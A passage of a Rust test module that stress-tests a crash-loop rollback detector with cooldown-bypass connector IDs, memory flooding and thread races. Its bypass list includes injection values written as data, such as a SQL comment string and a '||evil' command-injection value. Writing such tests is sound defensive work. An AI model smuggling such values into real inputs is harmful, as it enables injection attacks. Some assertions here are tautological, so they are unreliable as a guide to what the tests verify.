        assert!(initial_rollback.is_ok());
        if let Ok(decision) = initial_rollback {
            if decision.triggered {
                assert!(detector.in_cooldown_for(bypass_connector, 1020));
            }
        }

        // Cooldown bypass attack vectors
        let bypass_attacks = [
            // Connector ID manipulation to bypass cooldown tracking
            ("cooldown_bypass_target ", "Trailing space bypass"),
            (" cooldown_bypass_target", "Leading space bypass"),
            ("cooldown_bypass_target\x00", "Null byte bypass"),
            ("cooldown_bypass_target\t", "Tab character bypass"),
            ("cooldown_bypass_target\n", "Newline bypass"),
            ("cooldown_bypass_target\r", "Carriage return bypass"),
            // Unicode variations
            ("cooldown_bypass_target\u{200B}", "Zero-width space bypass"),
            ("cooldown_bypass_target\u{FEFF}", "BOM bypass"),
            (
                "cooldown_bypass_target\u{034F}",
                "Combining character bypass",
            ),
            // Case variations
            ("Cooldown_Bypass_Target", "Case variation bypass"),
            ("COOLDOWN_BYPASS_TARGET", "Uppercase bypass"),
            ("cooldown_Bypass_Target", "Mixed case bypass"),
            // Character substitution
            ("cooldown_bypass_targe7", "Character substitution bypass"),
            ("cooldown_bypas5_target", "Middle character substitution"),
            ("c00ld0wn_bypass_target", "Multiple substitution bypass"),
            // Homograph attacks
            ("сooldown_bypass_target", "Cyrillic 'c' bypass"),
            ("cooldown_bуpass_target", "Cyrillic 'y' bypass"),
            ("cooldown_bypass_tаrget", "Cyrillic 'a' bypass"),
            // Injection attempts
            ("cooldown_bypass_target'; --", "SQL injection bypass"),
            ("cooldown_bypass_target||evil", "Command injection bypass"),
            ("cooldown_bypass_target\"injected", "Quote injection bypass"),
        ];

        let base_timestamp = 1100; // During cooldown period

        for (attack_idx, (bypass_connector_id, attack_description)) in
            bypass_attacks.iter().enumerate()
        {
            println!(
                "Testing cooldown bypass attack {}: {}",
                attack_idx, attack_description
            );

            // Attempt to record crashes with bypass connector ID
            for i in 0..6 {
                detector.record_crash(
                    CrashEvent {
                        connector_id: bypass_connector_id.to_string(),
                        timestamp: format!("2024-01-01T13:{:02}:{:02}Z", attack_idx, i),
                        reason: format!("bypass_crash_{}_{}", attack_idx, i),
                    },
                    base_timestamp + (attack_idx * 100) as u64 + i,
                    format!("bypass_trace_{}_{}", attack_idx, i),
                );
            }

            // Create pin for bypass connector
            let bypass_pin = KnownGoodPin {
                connector_id: bypass_connector_id.to_string(),
                version: format!("1.{}.0", attack_idx),
                pin_hash: format!("bypass_hash_{}", attack_idx),
                trusted: true,
            };

            // Attempt rollback evaluation during cooldown
            let bypass_timestamp = base_timestamp + (attack_idx * 100) as u64 + 10;
            let bypass_result = detector.evaluate_rollback(
                bypass_connector_id,
                &bypass_pin,
                bypass_timestamp,
                format!("bypass_eval_trace_{}", attack_idx),
            );

            // Analyze bypass attempt results
            match bypass_result {
                Ok(decision) => {
                    if decision.triggered && decision.rollback_allowed {
                        // Check if this is a legitimate bypass due to different connector
                        if bypass_connector_id != &bypass_connector {
                            // Different connector should be allowed
                            assert!(
                                !detector.in_cooldown_for(bypass_connector_id, bypass_timestamp),
                                "Attack {}: Different connector should not be in cooldown",
                                attack_idx
                            );
                        } else {
                            // Same connector during cooldown should be blocked
                            if detector.in_cooldown_for(bypass_connector, bypass_timestamp) {
                                panic!(
                                    "SECURITY VIOLATION: Cooldown bypass succeeded for attack {}: {}",
                                    attack_idx, attack_description
                                );
                            }
                        }
                    }

                    // Verify decision integrity
                    assert!(
                        !decision.connector_id.is_empty(),
                        "Attack {}: Decision should have valid connector ID",
                        attack_idx
                    );
                    assert!(
                        !decision.trace_id.is_empty(),
                        "Attack {}: Decision should have valid trace ID",
                        attack_idx
                    );
                }
                Err(e) => {
                    // Expected behavior during cooldown
                    match e {
                        CrashLoopError::CooldownActive { .. } => {
                            // Verify cooldown error is for correct connector
                            if let CrashLoopError::CooldownActive { connector_id, .. } = e {
                                // Should reference the actual connector being tested
                                assert!(
                                    !connector_id.is_empty(),
                                    "Attack {}: Cooldown error should have valid connector ID",
                                    attack_idx
                                );
                            }
                        }
                        _ => {
                            // Other errors may be valid depending on bypass type
                            let error_msg = format!("{:?}", e);
                            assert!(
                                !error_msg.is_empty(),
                                "Attack {}: Error should be meaningful",
                                attack_idx
                            );
                        }
                    }
                }
            }

            // Verify original connector still in cooldown
            assert!(
                detector.in_cooldown_for(bypass_connector, bypass_timestamp),
                "Attack {}: Original connector should remain in cooldown",
                attack_idx
            );

            // Test incident logging for bypass attempts
            let incident_count = detector.incidents.len();
            assert!(
                incident_count > attack_idx,
                "Attack {}: Bypass attempts should generate incident logs",
                attack_idx
            );
        }

        // Test temporal cooldown bypass (waiting for cooldown to expire)
        let post_cooldown_timestamp = base_timestamp + 3700; // After default 60s cooldown + margin

        // Verify cooldown has expired
        assert!(
            !detector.in_cooldown_for(bypass_connector, post_cooldown_timestamp),
            "Cooldown should expire after sufficient time"
        );

        // Test legitimate rollback after cooldown expiration
        let post_cooldown_result = detector.evaluate_rollback(
            bypass_connector,
            &pin,
            post_cooldown_timestamp,
            "post_cooldown_legitimate".to_string(),
        );

        match post_cooldown_result {
            Ok(decision) => {
                // Should be allowed after cooldown expires
                if decision.crash_count >= 5 {
                    assert!(
                        decision.triggered,
                        "Rollback should be triggered after cooldown expires with sufficient crashes"
                    );
                    assert!(
                        decision.rollback_allowed,
                        "Rollback should be allowed after cooldown expires"
                    );
                }
            }
            Err(e) => {
                // May fail due to insufficient crashes in current window
                match e {
                    CrashLoopError::CooldownActive { .. } => {
                        panic!(
                            "Cooldown should have expired by timestamp {}",
                            post_cooldown_timestamp
                        );
                    }
                    _ => {
                        // Other errors acceptable
                    }
                }
            }
        }

        // Test rapid succession attacks after cooldown
        for rapid_idx in 0..5 {
            let rapid_result = detector.evaluate_rollback(
                bypass_connector,
                &pin,
                post_cooldown_timestamp + rapid_idx,
                format!("rapid_succession_{}", rapid_idx),
            );

            // Rapid evaluations should be handled safely
            assert!(
                rapid_result.is_ok() || rapid_result.is_err(),
                "Rapid succession evaluation {} should complete",
                rapid_idx
            );
        }

        println!(
            "Cooldown bypass attack test completed: {} bypass vectors + temporal bypass + rapid succession tested",
            bypass_attacks.len()
        );
    }

    #[test]
    fn test_extreme_adversarial_memory_exhaustion_via_incident_flooding() {
        // Test memory exhaustion attacks via incident flooding where attacker
        // attempts to consume excessive memory through crash event accumulation

        let mut detector = CrashLoopDetector::new();

        // Memory exhaustion attack patterns
        let memory_attack_scenarios = [
            // High-frequency crash flooding
            ("frequency_flood", 1000, "High frequency crash flooding"),
            // Large payload crashes
            ("large_payload", 100, "Large crash event payload"),
            // Many unique connectors
            ("unique_connectors", 500, "Many unique connector flooding"),
            // Mixed pattern flooding
            ("mixed_pattern", 300, "Mixed pattern memory pressure"),
        ];

        for (scenario_name, event_count, description) in memory_attack_scenarios.iter() {
            println!("Testing memory attack: {} - {}", scenario_name, description);

            use std::time::{Duration, Instant};
            let start_time = Instant::now();

            // Generate memory pressure events
            for event_idx in 0..*event_count {
                let crash_event = match *scenario_name {
                    "frequency_flood" => {
                        // High frequency with normal payloads
                        CrashEvent {
                            connector_id: "frequency_victim".to_string(),
                            timestamp: format!(
                                "2024-01-01T14:{:02}:{:02}Z",
                                (event_idx / 60) % 60,
                                event_idx % 60
                            ),
                            reason: format!("frequency_crash_{}", event_idx),
                        }
                    }
                    "large_payload" => {
                        // Large crash event payloads
                        CrashEvent {
                            connector_id: format!("large_connector_{}", event_idx % 10),
                            timestamp: format!("2024-01-01T15:00:{:02}Z", event_idx % 60),
                            reason: format!(
                                "large_crash_{}_{}_{}",
                                event_idx,
                                "A".repeat(1000), // Large reason field
                                "B".repeat(500)   // Additional payload
                            ),
                        }
                    }
                    "unique_connectors" => {
                        // Many unique connectors
                        CrashEvent {
                            connector_id: format!(
                                "unique_connector_{}_{}_{}",
                                event_idx,
                                "connector".repeat(10),
                                event_idx * 17 % 1000
                            ),
                            timestamp: format!("2024-01-01T16:00:{:02}Z", event_idx % 60),
                            reason: format!("unique_crash_{}", event_idx),
                        }
                    }
                    "mixed_pattern" => {
                        // Mixed patterns for complex memory pressure
                        CrashEvent {
                            connector_id: format!(
                                "mixed_{}_{}",
                                event_idx % 3,
                                if event_idx % 2 == 0 { "even" } else { "odd" }
                            ),
                            timestamp: format!(
                                "2024-01-01T17:{:02}:{:02}Z",
                                (event_idx / 60) % 60,
                                event_idx % 60
                            ),
                            reason: format!(
                                "mixed_crash_{}_{}_{}",
                                event_idx,
                                "pattern".repeat(event_idx % 5 + 1),
                                "X".repeat(event_idx % 100)
                            ),
                        }
                    }
                    _ => unreachable!(),
                };

                // Record crash event (potential memory exhaustion point)
                let record_result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                    detector.record_crash(
                        crash_event,
                        10000 + event_idx as u64,
                        format!("memory_attack_{}_{}", scenario_name, event_idx),
                    );
                }));

                match record_result {
                    Ok(()) => {
                        // Successful recording
                    }
                    Err(_) => {
                        println!(
                            "Memory attack {} event {} caused panic (caught)",
                            scenario_name, event_idx
                        );
                        break; // Stop flooding on panic
                    }
                }

                // Periodically check memory pressure indicators
                if event_idx % 100 == 0 {
                    let elapsed = start_time.elapsed();

                    // Should not take excessive time per batch
                    assert!(
                        elapsed < Duration::from_secs(10),
                        "Memory attack {}: Recording should not take excessive time: {:?}",
                        scenario_name,
                        elapsed
                    );

                    // Check incident count growth
                    let incident_count = detector.incidents.len();
                    assert!(
                        incident_count <= event_idx + 100,
                        "Memory attack {}: Incident count should be bounded: {}",
                        scenario_name,
                        incident_count
                    );

                    // Sample crash count queries (should remain performant)
                    let sample_count = detector.crashes_in_window_for(
                        &format!("sample_connector_{}", event_idx % 10),
                        10000 + event_idx as u64,
                    );

                    // Crash count queries should complete quickly
                    assert!(
                        sample_count <= 1000,
                        "Memory attack {}: Crash count should be reasonable: {}",
                        scenario_name,
                        sample_count
                    );
                }
            }

            let total_duration = start_time.elapsed();
            println!(
                "Memory attack {} completed: {} events in {:?}",
                scenario_name, event_count, total_duration
            );

            // Verify system remains responsive after flooding
            assert!(
                total_duration < Duration::from_secs(30),
                "Memory attack {}: Total processing should complete in reasonable time",
                scenario_name
            );

            // Test system functionality after memory pressure
            let test_event = CrashEvent {
                connector_id: format!("post_flood_test_{}", scenario_name),
                timestamp: "2024-01-01T18:00:00Z".to_string(),
                reason: "post_flood_test_crash".to_string(),
            };

            let post_flood_result = detector.record_crash(
                test_event,
                20000,
                format!("post_flood_test_{}", scenario_name),
            );

            // Should remain functional after memory attack
            // (record_crash returns (), so just verify it doesn't panic)

            let post_flood_count = detector
                .crashes_in_window_for(&format!("post_flood_test_{}", scenario_name), 20000);
            assert_eq!(
                post_flood_count, 1,
                "Memory attack {}: System should remain functional after flooding",
                scenario_name
            );
        }

        // Test memory pressure via incident accumulation
        let incident_count_before = detector.incidents.len();

        // Create many incidents through rollback attempts
        for incident_idx in 0..100 {
            let pin = KnownGoodPin {
                connector_id: format!("incident_connector_{}", incident_idx),
                version: "1.0.0".to_string(),
                pin_hash: format!("incident_hash_{}", incident_idx),
                trusted: true,
            };

            // This creates an incident regardless of outcome
            let _ = detector.evaluate_rollback(
                &format!("incident_connector_{}", incident_idx),
                &pin,
                30000 + incident_idx as u64,
                format!("incident_flood_{}", incident_idx),
            );
        }

        let incident_count_after = detector.incidents.len();
        let incidents_added = incident_count_after - incident_count_before;

        assert!(
            incidents_added > 0,
            "Incident flooding should create incidents"
        );
        assert!(
            incidents_added <= 100,
            "Incident count should be reasonable"
        );

        // Verify detector remains functional after incident flooding
        let final_test_event = CrashEvent {
            connector_id: "final_memory_test".to_string(),
            timestamp: "2024-01-01T19:00:00Z".to_string(),
            reason: "final_memory_test_crash".to_string(),
        };

        detector.record_crash(final_test_event, 40000, "final_memory_test".to_string());

        let final_count = detector.crashes_in_window_for("final_memory_test", 40000);
        assert_eq!(
            final_count, 1,
            "Detector should remain fully functional after all memory attacks"
        );

        println!(
            "Memory exhaustion attack test completed: {} scenarios + incident flooding tested",
            memory_attack_scenarios.len()
        );
    }

    #[test]
    fn test_extreme_adversarial_concurrent_rollback_race_exploitation() {
        // Test concurrent rollback race exploitation where multiple threads attempt
        // to exploit race conditions in rollback evaluation and cooldown management

        use std::sync::{Arc, Mutex};
        use std::thread;

        let detector = Arc::new(Mutex::new(CrashLoopDetector::new()));
        let race_connector = "concurrent_race_target";

        // Setup initial crash state for race conditions
        {
            let mut det = detector.lock().unwrap();
            for i in 0..8 {
                det.record_crash(
                    CrashEvent {
                        connector_id: race_connector.to_string(),
                        timestamp: format!("2024-01-01T20:{:02}:00Z", i),
                        reason: format!("race_setup_crash_{}", i),
                    },
                    50000 + i,
                    format!("race_setup_trace_{}", i),
                );
            }
        }

        // Shared state for race condition analysis
        let race_results = Arc::new(Mutex::new(Vec::new()));

        // Concurrent race attack patterns
        let race_scenarios = [
            // Simultaneous rollback evaluation race
            (
                "simultaneous_rollback",
                20,
                "Simultaneous rollback evaluation",
            ),
            // Cooldown bypass race
            ("cooldown_race", 15, "Cooldown state race condition"),
            // Incident recording race
            ("incident_race", 25, "Incident recording race condition"),
            // Mixed operation race
            ("mixed_ops_race", 30, "Mixed operations race condition"),
        ];

        for (race_name, thread_count, description) in race_scenarios.iter() {
            println!("Testing race condition: {} - {}", race_name, description);

            let mut handles = vec![];

            // Launch concurrent attack threads
            for thread_id in 0..*thread_count {
                let detector_clone = Arc::clone(&detector);
                let results_clone = Arc::clone(&race_results);
                let race_name_clone = race_name.to_string();

                let handle = thread::spawn(move || {
                    let mut thread_results = Vec::new();

                    match race_name_clone.as_str() {
                        "simultaneous_rollback" => {
                            // Multiple threads attempt simultaneous rollback
                            for attempt in 0..10 {
                                let pin = KnownGoodPin {
                                    connector_id: race_connector.to_string(),
                                    version: format!(
                                        "race_{}_{}_{}",
                                        race_name_clone, thread_id, attempt
                                    ),
                                    pin_hash: format!("race_hash_{}_{}", thread_id, attempt),
                                    trusted: true,
                                };

                                let rollback_result = {
                                    match detector_clone.lock() {
                                        Ok(mut det) => det.evaluate_rollback(
                                            race_connector,
                                            &pin,
                                            60000 + (thread_id * 100) as u64 + attempt,
                                            format!(
                                                "race_rollback_{}_{}_{}",
                                                race_name_clone, thread_id, attempt
                                            ),
                                        ),
                                        Err(_) => {
                                            thread_results.push((
                                                thread_id,
                                                attempt,
                                                "lock_poison".to_string(),
                                                false,
                                            ));
                                            continue;
                                        }
                                    }
                                };

                                let (success, triggered) = match rollback_result {
                                    Ok(decision) => (true, decision.triggered),
                                    Err(_) => (false, false),
                                };

                                thread_results.push((
                                    thread_id,
                                    attempt,
                                    "rollback".to_string(),
                                    success,
                                ));

                                // Brief yield to encourage race conditions
                                thread::yield_now();
                            }
                        }
                        "cooldown_race" => {
                            // Race condition in cooldown checking/setting
                            for attempt in 0..15 {
                                let cooldown_check = {
                                    match detector_clone.lock() {
                                        Ok(det) => {
                                            det.in_cooldown_for(race_connector, 61000 + attempt)
                                        }
                                        Err(_) => {
                                            thread_results.push((
                                                thread_id,
                                                attempt,
                                                "cooldown_lock_poison".to_string(),
                                                false,
                                            ));
                                            continue;
                                        }
                                    }
                                };

                                thread_results.push((
                                    thread_id,
                                    attempt,
                                    "cooldown_check".to_string(),
                                    cooldown_check,
                                ));

                                // Attempt rapid rollback evaluation during cooldown checks
                                let pin = KnownGoodPin {
                                    connector_id: race_connector.to_string(),
                                    version: "cooldown_race".to_string(),
                                    pin_hash: format!("cooldown_hash_{}", thread_id),
                                    trusted: true,
                                };

                                let eval_during_check = {
                                    match detector_clone.lock() {
                                        Ok(mut det) => det.evaluate_rollback(
                                            race_connector,
                                            &pin,
                                            61000 + attempt,
                                            format!(
                                                "cooldown_race_{}_{}_{}",
                                                race_name_clone, thread_id, attempt
                                            ),
                                        ),
                                        Err(_) => {
                                            thread_results.push((
                                                thread_id,
                                                attempt,
                                                "eval_lock_poison".to_string(),
                                                false,
                                            ));
                                            continue;
                                        }
                                    }
                                };

                                let eval_success = eval_during_check.is_ok();
                                thread_results.push((
                                    thread_id,
                                    attempt,
                                    "eval_during_cooldown".to_string(),
                                    eval_success,
                                ));

                                thread::yield_now();
                            }
                        }
                        "incident_race" => {
                            // Race condition in incident recording
                            for attempt in 0..20 {
                                // Simultaneous crash recording and evaluation
                                let crash_event = CrashEvent {
                                    connector_id: race_connector.to_string(),
                                    timestamp: format!("race_{}_{}", thread_id, attempt),
                                    reason: format!("race_crash_{}_{}", thread_id, attempt),
                                };

                                let record_result = {
                                    match detector_clone.lock() {
                                        Ok(mut det) => {
                                            det.record_crash(
                                                crash_event,
                                                62000 + (thread_id * 100) as u64 + attempt,
                                                format!(
                                                    "incident_race_{}_{}_{}",
                                                    race_name_clone, thread_id, attempt
                                                ),
                                            );
                                            true
                                        }
                                        Err(_) => false,
                                    }
                                };

                                thread_results.push((
                                    thread_id,
                                    attempt,
                                    "crash_record".to_string(),
                                    record_result,
                                ));

                                // Immediate evaluation after recording
                                let pin = KnownGoodPin {
                                    connector_id: race_connector.to_string(),
                                    version: "incident_race".to_string(),
                                    pin_hash: format!("incident_hash_{}", thread_id),
                                    trusted: true,
                                };

                                let immediate_eval = {
                                    match detector_clone.lock() {
                                        Ok(mut det) => det
                                            .evaluate_rollback(
                                                race_connector,
                                                &pin,
                                                62000 + (thread_id * 100) as u64 + attempt + 1,
                                                format!(
                                                    "incident_eval_{}_{}_{}",
                                                    race_name_clone, thread_id, attempt
                                                ),
                                            )
                                            .is_ok(),
                                        Err(_) => false,
                                    }
                                };

                                thread_results.push((
                                    thread_id,
                                    attempt,
                                    "immediate_eval".to_string(),
                                    immediate_eval,
                                ));
                                thread::yield_now();
                            }
                        }
                        "mixed_ops_race" => {
                            // Mixed operations to maximize race condition potential
                            for attempt in 0..10 {
                                let operations = [
                                    "crash_record",
                                    "rollback_eval",
                                    "cooldown_check",
                                    "crash_count",
                                ];

                                for (op_idx, operation) in operations.iter().enumerate() {
                                    let op_result = match *operation {
                                        "crash_record" => match detector_clone.lock() {
                                            Ok(mut det) => {
                                                det.record_crash(
                                                    CrashEvent {
                                                        connector_id: race_connector.to_string(),
                                                        timestamp: format!(
                                                            "mixed_{}_{}_{}",
                                                            thread_id, attempt, op_idx
                                                        ),
                                                        reason: format!(
                                                            "mixed_crash_{}_{}",
                                                            thread_id, op_idx
                                                        ),
                                                    },
                                                    63000
                                                        + (thread_id * 1000) as u64
                                                        + (attempt * 10) as u64
                                                        + op_idx as u64,
                                                    format!(
                                                        "mixed_record_{}_{}_{}",
                                                        thread_id, attempt, op_idx
                                                    ),
                                                );
                                                true
                                            }
                                            Err(_) => false,
                                        },
                                        "rollback_eval" => {
                                            let pin = KnownGoodPin {
                                                connector_id: race_connector.to_string(),
                                                version: "mixed_race".to_string(),
                                                pin_hash: format!(
                                                    "mixed_hash_{}_{}",
                                                    thread_id, attempt
                                                ),
                                                trusted: true,
                                            };

                                            match detector_clone.lock() {
                                                Ok(mut det) => det
                                                    .evaluate_rollback(
                                                        race_connector,
                                                        &pin,
                                                        63000
                                                            + (thread_id * 1000) as u64
                                                            + (attempt * 10) as u64
                                                            + op_idx as u64,
                                                        format!(
                                                            "mixed_eval_{}_{}_{}",
                                                            thread_id, attempt, op_idx
                                                        ),
                                                    )
                                                    .is_ok(),
                                                Err(_) => false,
                                            }
                                        }
                                        "cooldown_check" => match detector_clone.lock() {
                                            Ok(det) => det.in_cooldown_for(
                                                race_connector,
                                                63000
                                                    + (thread_id * 1000) as u64
                                                    + (attempt * 10) as u64
                                                    + op_idx as u64,
                                            ),
                                            Err(_) => false,
                                        },
                                        "crash_count" => match detector_clone.lock() {
                                            Ok(det) => {
                                                let count = det.crashes_in_window_for(
                                                    race_connector,
                                                    63000
                                                        + (thread_id * 1000) as u64
                                                        + (attempt * 10) as u64
                                                        + op_idx as u64,
                                                );
                                                count > 0
                                            }
                                            Err(_) => false,
                                        },
                                        _ => false,
                                    };

                                    thread_results.push((
                                        thread_id,
                                        attempt,
                                        operation.to_string(),
                                        op_result,
                                    ));
                                    thread::yield_now();
                                }
                            }
                        }
                        _ => unreachable!(),
                    }

                    // Store results for analysis
                    results_clone.lock().unwrap().extend(thread_results);
                });

                handles.push(handle);
            }

            // Wait for all race threads to complete
            for handle in handles {
                handle.join().expect("Race thread should complete");
            }

            // Analyze race condition results
            let results = race_results.lock().unwrap();
            let scenario_results: Vec<_> = results
                .iter()
                .filter(|(_, _, op, _)| op.contains(race_name))
                .collect();

            println!(
                "Race scenario {} completed: {} operations recorded",
                race_name,
                scenario_results.len()
            );

            // Verify system consistency after race conditions
            let final_state = {
                let det = detector.lock().unwrap();
                (
                    det.crashes_in_window_for(race_connector, 70000),
                    det.in_cooldown_for(race_connector, 70000),
                    det.incidents.len(),
                )
            };

            let (final_crash_count, final_cooldown_status, final_incident_count) = final_state;

            // System should remain in consistent state despite race conditions
            assert!(
                final_crash_count <= 1000,
                "Race {}: Final crash count should be reasonable: {}",
                race_name,
                final_crash_count
            );
            assert!(
                final_incident_count <= 10000,
                "Race {}: Final incident count should be reasonable: {}",
                race_name,
                final_incident_count
            );

            println!(
                "Race scenario {} analysis: crashes={}, cooldown={}, incidents={}",
                race_name, final_crash_count, final_cooldown_status, final_incident_count
            );
        }

        // Test system recovery after all race conditions
        let recovery_event = CrashEvent {
            connector_id: "post_race_recovery".to_string(),
            timestamp: "2024-01-01T23:00:00Z".to_string(),
            reason: "post_race_recovery_crash".to_string(),
        };

        {
            let mut det = detector.lock().unwrap();
            det.record_crash(recovery_event, 80000, "post_race_recovery".to_string());
        }

        let recovery_count = {
            let det = detector.lock().unwrap();
            det.crashes_in_window_for("post_race_recovery", 80000)
        };

        assert_eq!(
            recovery_count, 1,
            "System should fully recover after all race condition attacks"
        );

        println!(
            "Concurrent race exploitation test completed: {} race scenarios tested with {} total threads",
            race_scenarios.len(),
            race_scenarios
                .iter()
                .map(|(_, count, _)| count)
                .sum::<usize>()
        );
    }
}
